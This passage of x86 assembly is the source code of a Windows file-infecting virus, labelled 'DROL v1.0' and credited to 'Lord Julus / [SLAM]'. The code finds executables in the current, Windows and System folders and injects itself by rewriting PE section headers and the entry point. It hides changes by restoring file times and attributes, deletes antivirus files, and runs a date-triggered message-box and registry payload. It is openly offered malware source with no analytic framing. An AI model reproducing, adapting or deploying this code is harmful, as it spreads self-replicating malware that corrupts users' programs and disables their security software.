                                         ;
      cmp byte ptr [ebp+crt_dir_flag], 0 ; are we on a fixed disk?
      je direct_to_windows               ; if so only infect windows dirs
      mov dword ptr [ebp+offset infections], 3 ; infect 3 files there
      call infect_current_dir            ;
                                         ;
direct_to_windows:                       ;
      cmp ebp, 0                         ; first generation?
      je back_to_current_dir             ; if first gen., don't touch windirs
      lea eax, [ebp+offset windir]       ; Change to Windows directory
      push eax                           ;
      call dword ptr [ebp+offset ASetCurrentDirectoryA]
                                         ;
      mov dword ptr [ebp+offset infections], 3 ; infect 3 files there
      call infect_current_dir            ;
                                         ;
      lea eax, [ebp+offset sysdir]       ; Change to System directory
      push eax                           ;
      call dword ptr [ebp+offset ASetCurrentDirectoryA]
                                         ;
      mov dword ptr [ebp+offset infections], 3 ; infect 3 files there
      call infect_current_dir            ;
                                         ;
back_to_current_dir:                     ;
      lea eax, [ebp+offset crtdir]       ; Change back to current directory
      push eax                           ;
      call dword ptr [ebp+offset ASetCurrentDirectoryA]
                                         ;
      ret                                ;
Infect_directories endp                  ;

; -- Current Directory Infection -- ;

infect_current_dir proc near              ; This infects the current dir
      lea edi, [ebp+offset search]        ; point to Search Record
      mov eax, edi                        ;
      push eax                            ;
      lea eax, [ebp+offset exe_name]      ;
      push eax                            ;
      call dword ptr [ebp+offset AFindFirstFileAA] ; find first match
                                          ;
      cmp eax, 0FFFFFFFFh                 ; check for EAX = -1
      je no_files                         ;
      push eax                            ; save handle
      lea esi, [edi.FileName]             ; ESI = pointer to filename...
      mov ecx, [edi.FileSizeLow]          ; ECX = filesize
                                          ;
IF    INFECT                              ;
                                          ;
      call Infect_File                    ; infect file...
                                          ;
ENDIF                                     ;
                                          ;
      jc Another_file                     ;
      dec dword ptr [ebp+offset infections] ; decrement infection count
      cmp word ptr [ebp+offset infections], 0
      je All_done                         ;
                                          ;
Another_file:                             ;
      pop eax                             ;
      push eax                            ;
      push edi                            ; push find zone
      push eax                            ; push handle
      call dword ptr [ebp+offset AFindNextFileAA]
                                          ;
      test eax, eax                       ; no more files ?
      jz All_done                         ;
      lea esi, [edi.FileName]             ; ESI = pointer to filename...
      mov ecx, [edi.FileSizeLow]          ; ECX = filesize
      Call Infect_File                    ; infect file...
      jc failinfection                    ;
      dec dword ptr [ebp+infections]      ; decrement infection count
                                          ;
failinfection:                            ;
      cmp dword ptr [ebp+infections], 0   ; done ?
      jne Another_file                    ;
                                          ;
All_done:                                 ;
      pop eax                             ; thanx to T2000 for pointing
      push eax                            ; out that the FindFirst handle
      call dword ptr [ebp+ACloseHandleA]  ; should be also closed.
no_files:                                 ;
      if killav                           ;
      call kill_av_files                  ; try killing the av files in the
      endif                               ; current directory
      ret                                 ;
infect_current_dir endp                   ;
                                          ;
Infect_File proc near                     ;
      pushad                              ; save all registers
      mov dword ptr [ebp+newfilesize], ecx; save the initial filesize
      mov word ptr [ebp+infectionflag], 0 ; reset infection flag
      add ecx, virussize                  ; ecx = victim filesize + virus
      add ecx, 1000h                      ; + 1000h
      mov [ebp+offset memory], ecx        ; this will give us the memory
                                          ; to map...
      mov [ebp+offset fileofs], esi       ; esi = pointer to filename

; Save file's original attributes and set new ones

      push esi                            ; save it
      call dword ptr [ebp+AGetFileAttributesA]; Get the file attributes
      cmp eax, 0                          ;
      je error1                           ;
      mov [ebp+fileattributes], eax       ; save them
                                          ;
error1:                                   ;
      push 80h                            ;
      push esi                            ;
      call dword ptr [ebp+offset ASetFileAttributesA] ; set them as normal
                                          ;

; About to Open the File (ESI = pointer to filename)

      push 0                              ; file attributes
      push 0                              ; ""
      push 3                              ; OPEN EXISTING File
      push 0                              ; Security option = default
      push 1                              ; File share for read
      push 80000000h or 40000000h         ; General write and read
      push esi                            ; pointer to filename
      call dword ptr [ebp+offset ACreateFileA];
                                          ;
      mov [ebp+offset filehandle], eax    ; EAX = file handle
      cmp eax, -1                         ;
      je infection_error                  ; can't open file ?!?

; Save file's creation, last write, last access time

      mov ebx, offset ftcreation          ; save all 3 types of time
      add ebx, ebp                        ;
      push ebx                            ;
      add ebx, 8                          ;
      push ebx                            ;
      add ebx, 8                          ;
      push ebx                            ;
      push eax                            ;
      call dword ptr [ebp+AGetFileTimeA]  ;
                                          ;
      push 0                              ; save the filesize for later
      push dword ptr [ebp+offset filehandle] ; a little redundant here
      call dword ptr [ebp+AGetFileSizeA]     ; but I wanted to be sure
      mov dword ptr [ebp+offset newfilesize], eax

; About to create the file mapping for the file

      push 0                              ; filename handle = NULL
      push dword ptr [ebp+offset memory]  ; max size
      push 0                              ; min size (no need)
      push 4                              ; Page read & write
      push 0                              ; security attributes
      push dword ptr [ebp+offset filehandle] ;
      call dword ptr [ebp+offset ACreateFileMappingA] ; Map file !
                                          ; Eax = the handle of the map
      mov [ebp+offset maphandle], eax     ;
      cmp eax, 0                          ;
      je close_file                       ; can't map file ?!?
                                          ;
; About to map the view of the file       ;
                                          ;
      push dword ptr [ebp+offset memory]  ; bytes to map
      push 0                              ; blah, blah, blah...
      push 0                              ; ;-)
      push 2                              ; File Map Write Mode
      push eax                            ; File Map Handle
      call dword ptr [ebp+offset AMapViewOfFileA] ; Call API
                                          ;
      cmp eax, 0                          ;
      je close_map                        ; can't map view of file ?!?
      mov esi, eax                        ; ESI = base of map...
      mov [ebp+offset mapaddress], esi    ;
                                          ;
; Now the file is ready to work on at ESI !  ;
                                          ;
     cmp word ptr [esi.MZ_magic], 'ZM'    ; is it an EXE file?
     jne problem                          ;
                                          ;
     cmp word ptr [esi.MZ_csum], 'DR'     ; is it already infected?
     je problem                           ;
                                          ;
     mov edi, dword ptr [esi.MZ_lfanew]   ; take the PEheader offset
     cmp edi, 1000h                       ; too far away?
     ja problem                           ;
                                          ;
     add edi, esi                         ;
                                          ;
     cmp word ptr [edi.PE_Magic], 'EP'    ; is it a PE?
     jne problem                          ;
                                          ;
     mov dword ptr [ebp+PEheader], edi    ; save header address
                                          ;
     mov ax, word ptr [edi.Characteristics]
     test ax, 2000h                       ; dynamic library?
     jnz problem                          ;
                                          ;
     add edi, IMAGE_FILE_HEADER_SIZE      ; go to optional header
                                          ;
     mov eax, dword ptr [edi.OH_FileAlignment]      ; save all the needed
     mov dword ptr [ebp+filealign], eax             ; values
     mov eax, dword ptr [edi.OH_SectionAlignment]   ;
     mov dword ptr [ebp+sectionalign], eax          ;
     mov eax, dword ptr [edi.OH_AddressOfEntryPoint];
     mov dword ptr [ebp+oldeip], eax                ;
     mov eax, dword ptr [edi.OH_ImageBase]          ;
     mov dword ptr [ebp+newimagebase], eax          ;
                                                    ;
     mov eax, dword ptr [edi.OH_DataDirectory.DE_BaseReloc.DD_VirtualAddress]
     mov dword ptr [ebp+relocations], eax      ; save the relocations addr
     mov eax, dword ptr [edi.OH_DataDirectory.DE_Resource.DD_VirtualAddress]
     mov dword ptr [ebp+resources], eax        ; save the resource addr
                                                    ;
     mov ebx, dword ptr [edi.OH_NumberOfRvaAndSizes]; let us locate the
     shl ebx, 3                                     ; last section
     xor eax, eax                                   ;
     mov ax, word ptr [edi.NumberOfSections-IMAGE_FILE_HEADER_SIZE]
     dec eax                                        ;
     mov ecx, IMAGE_SECTION_HEADER_SIZE             ;
     mul ecx                                        ;
                                                    ;
     mov esi, dword ptr [ebp+PEheader]              ; PE header offset +
     add esi, IMAGE_FILE_HEADER_SIZE                ; header length +
     add esi, 60h                                   ; optional header len +
     add esi, ebx                                   ; + data directory
     add esi, eax                                   ; + all sections
                                                    ;
     mov eax, dword ptr [esi.SH_VirtualAddress]     ;
     mov dword ptr [ebp+savedRVA], eax              ;
                                                    ;
     mov ecx, dword ptr [ebp+relocations]           ;
     cmp ecx, 0                                     ; do we have relocs?
     je no_relocations                              ;
                                                    ;
     cmp ecx, eax                                   ; is relocs sec. last?
     jne no_reloc_sec_last                          ;
                                                    ;
     mov dword ptr [ebp+LJFlag], 1                  ; we can go safely
     jmp no_more_checks2                            ;
                                                    ;
no_reloc_sec_last:                                  ;
no_relocations:                                     ;
     mov ecx, dword ptr [ebp+resources]             ; do we have resources?
     cmp ecx, 0                                     ;
     je problem                                     ; no... abort
                                                    ;
     cmp ecx, eax                                   ;
     jne problem                                    ; is it last?
                                                    ;
     mov dword ptr [ebp+LJFlag], 3                  ; situation (3)
                                                    ;
no_more_checks2:                                    ;
     mov dword ptr [ebp+LastSection], esi           ; save it's place
     mov edi, esi                                   ; and make a copy of
     add edi, IMAGE_SECTION_HEADER_SIZE             ; it immediately
     mov ecx, IMAGE_SECTION_HEADER_SIZE             ; following...
     rep movsb                                      ;
                                                    ;
     push dword ptr [esi.SH_VirtualSize]            ; now allocate space for
     push 0040h                                     ; the last section body
     call dword ptr [ebp+AGlobalAllocA]             ;
     or eax, eax                                    ;
     je problem                                     ;
                                                    ;
     mov edi, eax                                   ; and now lets...
     mov ecx, dword ptr [esi.SH_VirtualSize]        ;
     push ecx                                       ;
     mov esi, dword ptr [esi.SH_PointerToRawData]   ;
     add esi, dword ptr [ebp+mapaddress]            ;
     push esi                                       ;
     rep movsb                                      ; ...move section to memo
                                                    ;
     pop edi                                        ; now let's copy the virus
     lea esi, dword ptr [ebp+start]                 ; where the old last
     mov ecx, virussize                             ; section was
     rep movsb                                      ;
                                                    ;
     push eax                                       ; eax=memory zone
                                                    ;
     mov eax, virussize                             ; increase SizeOfRawData
     mov ecx, dword ptr [ebp+filealign]             ; and align it to the file
     push eax                                       ; alignment
     push ecx                                       ;
     xor edx, edx                                   ;
     div ecx                                        ;
     pop ecx                                        ;
     add ecx, virussize                             ;
     sub ecx, edx                                   ;
     js strange_error                               ; could this happen? ;-)
     mov dword ptr [ebp+newsizeofrawdata], ecx      ;
     pop eax                                        ;
     mov al, 0                                      ; zero until end
     rep stosb                                      ;
                                                    ;
strange_error:                                      ;
     pop eax                                        ; memory area
     pop ecx                                        ; copy the old section
     mov esi, eax                                   ; after the virus
     sub edi, virussize                             ; body
     rep movsb                                      ;
     mov dr0, edi                                   ; save last write place
                                                    ;
     call getrandomname                             ; random section name
     mov esi, dword ptr [ebp+LastSection]           ; go to the last section
     push esi                                       ; place (now the before
     xchg esi, edi                                  ; last section with the
     lea esi, dword ptr [ebp+secname]               ; virus) and set the
     mov ecx, 8                                     ; section new name.
     rep movsb                                      ;
     pop esi                                        ;
     mov dword ptr [esi+SH_Characteristics], 0C0000040h ; make it writable
     mov dword ptr [esi.SH_VirtualSize], virussize  ; set the virtual size
     mov eax, dword ptr [ebp+newsizeofrawdata]      ; and the size of raw
     mov dword ptr [esi.SH_SizeOfRawData], eax      ; data
                                                    ;
     mov ebx, dword ptr [esi.SH_VirtualAddress]     ; take the virtual
                                                    ; address
     push ebx                                       ; and save it
                                                    ;
     add ebx, eax                                   ; now let's take care
                                                    ; of the real last sect.
     xchg eax, ebx                                  ;
     mov ecx, dword ptr [ebp + offset sectionalign] ; take section align
     xor edx,edx                                    ;
     div ecx                                        ;
     inc eax                                        ; and make sure RVA
     mul ecx                                        ; is aligned to it
     xchg eax, ebx                                  ;
                                                    ;
     add esi, IMAGE_SECTION_HEADER_SIZE             ;
     add dword ptr [esi.SH_PointerToRawData], eax   ; set pointer to raw
     push ebx                                       ; let's calculate the
     mov ecx, dword ptr [esi.SH_VirtualAddress]     ; delta RVA we need to
     sub ebx, ecx                                   ; relocate the resources
     mov dword ptr [ebp+DeltaRVA], ebx              ; with...
     pop ebx                                        ;
     mov dword ptr [esi.SH_VirtualAddress], ebx     ; set RVA
     mov dword ptr [ebp+newRVA], ebx                ;
                                                    ;
     cmp dword ptr [ebp+LJFlag], 1                  ;
     je go_on                                       ;

; If we are here, then we must rearrange the resource section by increasing
;  each  entry  with  the  DeltaRVA.  The  code below is a multi reentrance
; procedure that parses the strange structure of the resource section:

     mov esi, dword ptr [esi.SH_PointerToRawData]   ; Point the resources
     add esi, dword ptr [ebp+mapaddress]            ; and align in memo
     mov edi, esi                                   ; save in edi
     add edi, IMAGE_RESOURCE_DIRECTORY_SIZE         ; skip resource dir
     call parse_resource_directory                  ; parse all
     jmp go_on                                      ; go furthure...
                                                    ;
parse_resource_directory:                           ;
     xor ecx, ecx                                   ;
     mov cx, word ptr [esi.RD_NumberOfNamedEntries] ; NamedEntries+IdEntries
     add cx, word ptr [esi.RD_NumberOfIdEntries]    ; is our counter
                                                    ;
     add esi, IMAGE_RESOURCE_DIRECTORY_SIZE         ; skip resource dir
                                                    ;
parse_this_one:                                     ;
     push ecx                                       ; save counter
     push esi                                       ; save address
     call parse_resource                            ; parse the dir
     pop esi                                        ; restore address
     pop ecx                                        ; restore counter
     add esi, 8                                     ; get next entry
     loop parse_this_one                            ; loop until cx=0
     ret                                            ; return
                                                    ;
parse_resource:                                     ;
     mov eax, [esi.RDE_OffsetToData]                ; get offset to data
     mov esi, edi                                   ; get base of resorurces
     test eax, 80000000h                            ; is it a subdirectory?
     jz data_is_resource                            ;
                                                    ;
data_is_directory:                                  ;
     xor eax, 80000000h                             ; if it is a subdirectory
     add esi, eax                                   ; find it's address and
     sub esi, 10h                                   ;
     call parse_resource_directory                  ; go to parse it too...
     ret                                            ;
                                                    ;
data_is_resource:                                   ; if it is data, then
     add esi, eax                                   ; find out it's address
     sub esi, 10h                                   ;
     mov eax, dword ptr [ebp+DeltaRVA]              ; and increment the offs
     add dword ptr [esi.REDE_OffsetToData], eax     ; to data with our Delta
     ret                                            ; and ret...
                                                    ;
go_on:                                              ;
     mov eax, dword ptr [ebp+newfilesize]   ; calculate new file size
     add eax, virussize                     ; by adding the virus length
     mov ecx, dword ptr [ebp+filealign]     ; and rounding it up to the
     push eax                               ; file alignement
     push ecx                               ;
     xor edx, edx                           ;
     div ecx                                ;
     pop ecx                                ;
     sub ecx, edx                           ;
     pop eax                                ;
     add eax, ecx                           ;
     mov dword ptr [ebp+newfilesize], eax   ;
                                            ;
     mov ecx, dr0                           ; restore last write place
     sub ecx, mapaddress                    ; now actually get the old
     sub eax, ecx                           ; file size and substract it
     js dont_do_it                          ; (if last sec. is strip)
     xchg eax, ecx                          ; from the new filesize and
     mov edi, dr0                           ; then fill with zero until
     mov al, 0                              ; the end of the file.
     rep stosb                              ;
                                            ;
dont_do_it:                                 ;
     mov esi, dword ptr [ebp+PEheader]      ; increase number of sections
     inc dword ptr [esi.NumberOfSections]   ;
     add esi, IMAGE_FILE_HEADER_SIZE        ;
                                            ;
     pop ebx                                ; restore virus RVA
                                            ;
     mov dword ptr [esi.OH_AddressOfEntryPoint], ebx ; and set it as EIP

     mov eax, dword ptr [esi.OH_SizeOfImage]; Get OldSizeOfImage
     add eax, virussize                     ; increase it and then
     mov ecx, dword ptr [ebp+sectionalign]  ; align it to the section
     push eax                               ; alignement
     push ecx                               ;
     xor edx, edx                           ;
     div ecx                                ;
     pop ecx                                ;
     sub ecx, edx                           ;
     pop eax                                ;
     add eax, ecx                           ;
     mov dword ptr [esi.OH_SizeOfImage], eax;

; Let's check if the section we moved was one of the sections that is
; cought inside the DirectoryEntries and if so, let's mark it's new RVA:

     mov ebx, dword ptr [ebp+savedRVA]      ; take the saved rva
                                            ;
     lea esi, dword ptr [esi.OH_DataDirectory] ; where to check
     mov ecx, IMAGE_NUMBEROF_DIRECTORY_ENTRIES ; how many to check
                                            ;
directory_search:                           ;
     lodsd                                  ; take one RVA
     cmp ebx, eax                           ; and compare it
     jne not_yet                            ;
                                            ;
     mov eax, dword ptr [ebp+newRVA]        ; if we found the place, just
     mov dword ptr [esi-4], eax             ; put the new RVA there and
     jmp over_directories                   ; go away...
                                            ;
not_yet:                                    ;
     lodsd                                  ; ...otherwise keep going...
     loop directory_search                  ;
                                            ;
over_directories:                           ;
     mov esi, dword ptr [ebp+mapaddress]    ; mark as infected
     mov word ptr [esi.MZ_csum], 'DR'       ;
     mov word ptr [ebp+infectionflag], 0    ; infection ok!!
     jmp Unmap_view                         ;
                                            ;
problem:                                    ;
      mov word ptr [ebp+infectionflag], 0FFh; infection failed!!
                                            ;
Unmap_view:                                 ; first unmap the view
      push dword ptr [ebp+offset mapaddress] ;
      call dword ptr [ebp+AUnmapViewOfFileA] ;
                                          ;
close_map:                                ;
      push dword ptr [ebp+offset maphandle]  ; then close the map handle
      call dword ptr [ebp+ACloseHandleA]  ;
                                          ;
close_file:                               ; then close file handle,
      push 0                              ; first we must set the file
      push 0                              ; pointer at the end of file
      push dword ptr [ebp+offset newfilesize]; (that is the beginning +
      push dword ptr [ebp+offset filehandle] ;  new file size)
      call dword ptr [ebp+offset ASetFilePointerA] ;
                                          ;
      push dword ptr [ebp+offset filehandle] ; ...and then mark the end of
      call dword ptr [ebp+offset ASetEndOfFileA]   ; file...
                                          ;
      mov ebx, offset ftcreation          ; but first restore it's
      add ebx, ebp                        ; original date and time
      push ebx                            ;
      add ebx, 8                          ;
      push ebx                            ;
      add ebx, 8                          ;
      push ebx                            ;
      push dword ptr [ebp+offset filehandle] ;
      call dword ptr [ebp+ASetFileTimeA]  ;

      push dword ptr [ebp+offset filehandle] ; now, close !
      call dword ptr [ebp+ACloseHandleA]  ;
                                          ;
; Restore File Attributes

      push dword ptr [ebp+offset fileattributes]
      push dword ptr [ebp+offset fileofs] ;
      call dword ptr [ebp+offset ASetFileAttributesA]
      jmp infection_succesful             ;
                                          ;
infection_error:                          ;
      stc                                 ; CF set if an error occured
      jmp outahere                        ; or file was already infected
                                          ;
infection_succesful:                      ;
      cmp word ptr [ebp+offset infectionflag], 0FFh
      je infection_error                  ;
      clc                                 ; if all is ok, CF is reset
                                          ;
outahere:                                 ;
      popad                               ; restore registers
      ret                                 ;
Infect_File endp                          ;
                                          ;
; -- Payload -- ;                         ;

Payload proc near                             ;
       pusha                                  ;
       lea eax, [ebp+offset u32]              ; try to retrieve USER32 module
       push eax                               ;
       call dword ptr [ebp+offset AGetModuleHandleA];
       cmp eax, 0                             ;
       je no_payload                          ;
       mov dword ptr [ebp+user32], eax        ; try to retrieve the address
       lea eax, [ebp+offset AMessageBox]      ; of the MessageBoxA function
       push eax                               ;
       mov eax, dword ptr [ebp+user32]        ;
       push eax                               ;
       call dword ptr [ebp+offset AGetProcAddressA]
       cmp eax, 0                             ;
       je no_payload                          ;
       mov ebx, eax                           ; Get the System Time
       lea eax, [ebp+offset systemtime]       ;
       mov edi, eax                           ;
       push eax                               ;
       call dword ptr [ebp+offset AGetSystemTimeA]
       mov eax, dword ptr [edi+4]             ;
       and eax, 0FFFF0000h                    ;
       shr eax, 10h                           ; Eax = Day of Month...
       cmp eax, 7                             ; is it 7 ?
       jne no_payload                         ;
                                              ;
; Payload                                     ;
       push 00h or 1000h or 030h              ; AlwaysOnTop + Ok button
       lea eax, [ebp+offset windowtitle]      ; + icon exclamation
       push eax                               ;
       lea eax, [ebp+offset windowmessage]    ;
       push eax                               ;
       push 0                                 ;
       call ebx                               ; display message
                                              ;
       lea eax, [ebp+offset aa32]             ; try to retrieve ADVAPI32
       push eax                               ;
       call dword ptr [ebp+offset AGetModuleHandleA];
       cmp eax, 0                             ;
       je no_payload                          ;
                                              ;
       mov ebx, eax                           ; retrieve the ADVAPI Apis
       lea eax, [ebp+offset aa321]            ; that we need
       push eax                               ;
       push ebx                               ;
       call [ebp+offset AGetProcAddressA]     ;
       cmp eax, 0                             ;
       je no_payload                          ;
                                              ;
       mov dword ptr [ebp+ARegCreateKeyExA], eax ; first api
                                              ;
       lea eax, [ebp+offset aa322]            ;
       push eax                               ;
       push ebx                               ;
       call [ebp+offset AGetProcAddressA]     ;
       cmp eax, 0                             ;
       je no_payload                          ;
                                              ;
       mov dword ptr [ebp+ARegSetValueExA], eax ; second api
                                              ;
       push  128                              ; Get System directory
       lea eax, [ebp+offset fullpath]         ;
       push eax                               ;
       call dword ptr [ebp+offset AGetSystemDirectoryA]
                                              ;
       lea edi, [ebp+fullpath]                ; now we must create smth.
       mov al, 0                              ; like this:
       mov ecx, 128                           ; c:\windows\system\drol.cur
       repnz scasb                            ;
       mov byte ptr [edi-1], '\'              ;
       lea esi, [ebp+initfile]                ;
       mov ecx, 9                             ;
       rep movsb                              ;
                                              ;
       lea esi, [ebp+fullpath]                ; esi points to filename
       push 0                                 ; template attributes
       push 0                                 ; file attributes
       push 2                                 ; OPEN new File
       push 0                                 ; Security option = default
       push 1                                 ; File share for read
       push 80000000h or 40000000h            ; General write and read
       push esi                               ; pointer to filename
       call [ebp+offset ACreateFileA]         ;
                                              ; EAX = file handle
       mov [ebp+offset filehandle], eax       ;
       cmp eax, 0FFFFFFFFh                    ;
       je no_payload                          ; can't open file ?!?
                                              ;
       push 0                                 ; write the file
       lea eax, dword ptr [ebp+offset numofb] ;
       push eax                               ;
       push length                            ;
       lea eax, dword ptr [ebp+offset newcursor]
       push eax                               ;
       push dword ptr [ebp+filehandle]        ;
       call [ebp+offset AWriteFileA]          ;
                                              ;
       push dword ptr [ebp+filehandle]        ; close the file
       call [ebp+offset ACloseHandleA]        ;
                                              ;
       lea eax, [ebp+offset disposition]      ; existing or new?
       push eax                               ;
       lea eax, [ebp+offset key_handle]       ; new key handle
       push eax                               ;
       push 0                                 ; security attrib
       push KEY_ALL_ACCESS                    ; all access
       push REG_OPTION_NONVOLATILE            ; don't destroy at reboot
       push 0                                 ; class
       push 0                                 ; reserved
       lea eax, dword ptr [ebp+offset key]    ;
       push eax                               ;
       push HKEY_CURRENT_USER                 ; parent key
       call [ebp+offset ARegCreateKeyExA]     ; open the key
                                              ;
       push 25                                ; new value length
       lea eax, [ebp+offset fullpath]         ;
       push eax                               ;
       push REG_SZ                            ; make it string
       push 0                                 ; reserved
       lea eax, [ebp+key_name]                ;
       push eax                               ;
       mov eax, dword ptr [ebp+key_handle]    ;
       push eax                               ; new key handle
       call [ebp+offset ARegSetValueExA]      ; and set the new value
                                              ;
no_payload:                                   ;
       popa                                   ;
       ret                                    ;
Payload endp                                  ;

windowtitle db "DROL v1.0                                  ", 0
windowmessage db 13,10,13,10
              db "This is the DROL virus", 13, 10, 13, 10
              db "copyright (C) Lord Julus / [SLAM]",13,10, 13, 10
              db "written for fun... ;-)",13,10
              db 13,10, 0
fullpath db 260 dup (0)
initfile db "drol.cur", 0
newcursor:
        db 0,0,2,0,1,0,32,32,2,0,0,0
        db 0,0,48,1,0,0,22,0,0,0,40,0
        db 0,0,32,0,0,0,64,0,0,0,1,0
        db 1,0,0,0,0,0,0,2,0,0,0,0
        db 0,0,0,0,0,0,0,0,0,0,0,0
        db 0,0,0,0,0,0,255,255,255,0,0,0
        db 0,0,0,0,0,0,0,0,0,0,0,0
        db 0,0,0,5,40,0,0,5,40,0,0,5
        db 40,0,0,7,248,0,0,3,240,0,0,3
        db 240,0,0,7,248,0,0,7,56,0,0,14
        db 28,0,0,15,60,0,0,31,62,0,0,31
        db 254,0,0,29,238,0,0,24,198,0,0,29
        db 238,0,0,31,254,0,0,15,254,0,0,15
        db 252,0,0,15,252,0,0,7,248,0,0,7
        db 248,0,0,1,224,0,0,0,0,0,0,0
        db 0,0,0,0,0,0,0,0,0,0,0,0
        db 0,0,0,0,0,0,255,255,255,252,255,255
        db 255,248,255,253,47,241,255,248,7,227,255,240
        db 3,199,255,240,3,143,255,240,3,31,255,240
        db 2,63,255,248,4,127,255,248,0,255,255,240
        db 1,255,255,240,3,255,255,224,1,255,255,224
        db 1,255,255,192,0,255,255,192,0,255,255,192
        db 0,255,255,192,0,255,255,192,0,255,255,192
        db 0,255,255,192,0,255,255,128,1,255,255,0
        db 1,255,238,48,3,255,236,112,3,255,200,248
        db 7,255,193,254,31,255,195,255,255,255,128,127
        db 255,255,129,255,255,255,143,255,255,255,127,255
        db 255,255
length  = $-offset newcursor

numofb     dd 0

HKEY_CURRENT_USER      EQU 80000001h         ; Where to create key
REG_SZ                 EQU 1                 ; Create String values
REG_OPTION_NONVOLATILE EQU 0                 ; Do not destroy at reboot
KEY_ALL_ACCESS         EQU 0F003FH           ; all access
                                             ;
disposition dd 0                             ; -
key_handle  dd 0                             ; - values returned by Create
key         db "Control Panel\Cursors", 0    ; new key
key_name    db "Arrow", 0                    ; key name
                                             ;
; -- Kill Av files procedure -- ;            ;
                                             ;
kill_av_files proc near                      ;
      pushad                                 ;
      lea edi, [ebp+offset search]           ; point to Search Record
      lea esi, [ebp+offset av_list]          ; point av files list
                                             ;
locate_next_av:                              ;
      mov eax, dword ptr [esi]               ;
      add eax, ebp                           ; ax = address of file name
      cmp byte ptr [eax], 0FFh               ; is this the end?
      je av_kill_done                        ;
      push edi                               ; push search record address
      push eax                               ; push filename address
      call dword ptr [ebp+offset AFindFirstFileAA] ; find first match
      cmp eax, 0FFFFFFFFh                    ; check for EAX = -1
      je next_av_file                        ;
      push eax                               ;
      lea ebx, [edi.FileName]                ; ESI = pointer to filename...
      push ebx                               ; push filename address
      call dword ptr [ebp+ADeleteFileAA]     ; delete file!
                                             ;
      call dword ptr [ebp+ACloseHandleA]     ; close the find handle
                                             ;
next_av_file:                                ;
      add si, 4                              ; next file
      jmp locate_next_av                     ;
                                             ;
av_kill_done:                                ;
      popad                                  ;
      ret                                    ;
kill_av_files endp                           ;


                                          ;
; -- Random stuff -- ;                    ;
                                          ;
getrandomname proc near                   ; here we get a random name for
       pushad                             ; the virus section
       mov eax, 5                         ; a name with length between
       call brandom32                     ; 1-7
       add eax, 3                         ;
       mov ebx, 7                         ;
       sub ebx, eax                       ;
       lea edi, dword ptr [ebp+secname]   ;
       mov al, '.'                        ;
       stosb                              ;
       mov ecx, 7                         ;
                                          ;
nameloop:                                 ;
       cmp ecx, ebx                       ;
       jbe zero                           ;
       mov eax, 7Ah-61h                   ; made up from chars 'a'..'z'
       call brandom32                     ;
       add eax, 61h                       ;
       stosb                              ;
       loop nameloop                      ;
zero:                                     ;
       mov al, 0                          ; and zero padded
       stosb                              ;
       loop nameloop                      ;
       popad                              ;
       ret                                ;
getrandomname endp                        ;
                                          ;
randomize proc near                       ;
       push eax                           ; this randomize procedure must
       mov eax, dword ptr [esp-8]         ; be called first when the word
       add dword ptr [ebp+seed], eax      ; on the stack is smth. like
       pop eax                            ; 0BF87.... and it is different
       ret                                ; for each loaded file depending
randomize endp                            ; on different thingies. The
                                          ; seed gets incremented anyway
random32 proc near                        ; from generation to generation.
       push ecx                           ;
       xor ecx, ecx                       ;
       mov eax, dword ptr [ebp+seed]      ;
       mov cx, 33                         ;
                                          ;
rloop:                                    ;
       add eax, eax                       ;
       jnc $+4                            ;
       xor al, 197                        ;
       loop rloop                         ;
       mov dword ptr [ebp+seed], eax      ;
       pop ecx                            ;
       ret                                ;
random32 endp                             ;
seed dd 1                                 ;
                                          ;
brandom32 proc near                       ;
       push edx                           ; this procedure expects a value
       push ecx                           ;
       mov edx, 0                         ; in EAX and returns a random
       push eax                           ; number in EAX but smaller than
       call random32                      ; EAX's original value. Actually
       pop ecx                            ; it bounds EAX (0<=EAX<=limit-1)
       div ecx                            ; EDX and ECX are preserved
       xchg eax, edx                      ;
       pop ecx                            ;
       pop edx                            ;
       ret                                ;
brandom32 endp                            ;
                                          ;
end:                                      ;
end start                                 ;
end                                       ;
; -- End -- ;
